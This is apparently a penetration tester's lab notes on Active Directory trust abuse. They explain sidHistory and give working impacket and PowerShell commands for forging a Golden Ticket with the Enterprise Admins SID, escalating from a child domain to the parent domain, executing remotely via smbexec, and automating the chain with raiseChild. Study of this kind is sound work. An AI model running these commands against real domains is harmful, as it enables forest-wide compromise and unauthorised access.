#trusts 
# Theory
## SID History Primer
The [sidHistory](https://docs.microsoft.com/en-us/windows/win32/adschema/a-sidhistory) attribute is used in migration scenarios. If a user in one domain is migrated to another domain, a new account is created in the second domain. The original user's SID will be added to the new user's SID history attribute, ensuring that the user can still access resources in the original domain.

---

we are creating a Golden Ticket from the compromised child domain to compromise the parent domain. In this case, we will leverage the SIDHistory to grant an account (or non-existent account) Enterprise Admin rights by modifying this attribute to contain the SID for the Enterprise Admins group, which will give us full access to the parent domain without actually being part of the group.

To perform this attack after compromising a child domain, we need the following:
- The `KRBTGT` hash for the child domain (DCSync)
- The SID for the child domain (lookupsid.py)
- The name of a target user in the child domain (does not need to exist!)
- The FQDN of the child domain.
- The SID of the Enterprise Admins group of the root domain. (lookupsid.py)

getting Enterprise admins SID from windows
```powershell
Get-DomainGroup -Domain SEVENKINGDOMS.LOCAL -Identity
"Enterprise Admins"

Get-ADGroup  -Server SEVENKINGDOMS.LOCAL  "Enterprise Admins"
```

Then we can use `tickter.py` to make a golden ticket
```bash
ticketer.py -nthash 60d3803405f9c6f1c4f2ab08a0c18da0 -domain north.sevenkingdoms.local -domain-sid S-1-5-21-3276181164-781382281-1178861266 -extra-sid S-1-5-21-2540969834-2161428906-2182590186-519 hacker
```
-nthash is for krbtgt hash


export it
```bash
export KRB5CCNAME=hacker.ccache
```

use it
```bash
impacket-smbexec -k -no-pass @kingslanding
```

### automate the whole process
```bash
impacket-raiseChild -hashes "aad3b435b51404eeaad3b435b51404ee:dbd13e1c4e338284ac4e9874f7de6ef4" north.sevenkingdoms.local/Administrator -target-exec 192.168.56.10

```

---
